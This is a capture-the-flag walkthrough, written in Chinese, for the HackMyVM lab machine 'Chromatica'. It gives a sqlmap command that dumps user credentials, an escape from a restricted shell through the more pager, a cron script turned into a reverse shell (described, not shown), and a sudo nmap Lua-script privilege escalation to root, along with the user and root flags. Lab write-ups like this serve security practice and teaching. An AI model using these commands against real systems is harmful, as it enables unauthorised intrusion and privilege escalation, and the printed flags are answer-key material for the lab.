# Chromatica

2025.03.28 https://hackmyvm.eu/machines/machine.php?vm=Chromatica

[video]()

## Ip

192.168.5.39

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5353/tcp open  mdns
```

robots 显示：

```
user-agent: dev
Allow: /dev-portal/
```

浏览器添加 ua 为 dev，在访问这个目录，跳转到 http://192.168.5.39/dev-portal/search.php?city= 存在 sql 注入，

```
sqlmap -r req.txt --flush-session --batch -D Chromatica -T users --dump

+----+-----------------------------------------------+-----------+-----------------------------+
| id | password                                      | username  | description                 |
+----+-----------------------------------------------+-----------+-----------------------------+
| 1  | 8d06f5ae0a469178b28bbd34d1da6ef3 (adm!n)      | admin     | admin                       |
| 2  | 1ea6762d9b86b5676052d1ebd5f649d7 (flaghere)   | dev       | developer account for taz   |
| 3  | 3dd0f70a06e2900693fc4b684484ac85 (keeptrying) | user      | user account for testing    |
| 4  | f220c85e3ff19d043def2578888fb4e5              | dev-selim | developer account for selim |
| 5  | aaf7fb4d4bffb8c8002978a9c9c6ddc9 (intern00)   | intern    | intern                      |
+----+-----------------------------------------------+-----------+-----------------------------+

```

ssh 登陆爆破，login: dev password: flaghere

ssh 登陆时 bash 被限制了，这时缩小窗口，显示提示信息时会出现 more 的样式，直接输入 !/bin/bash 就能进入到 shell。

```
dev@Chromatica:~$ cat user.txt
brightctf{ONE_OCKLOCK_8cfa57b4168}
```

发现脚本 /opt/scripts/end_of_day.sh ，应该是 analyst 用户定时在执行，修改成反弹 shell，等待反弹。

sudo -l (ALL : ALL) NOPASSWD: /usr/bin/nmap

```
TF=$(mktemp); echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
```

拿到 root flag:

```
brightctf{DIR_EN_GREY_59ce1d6c207}
```
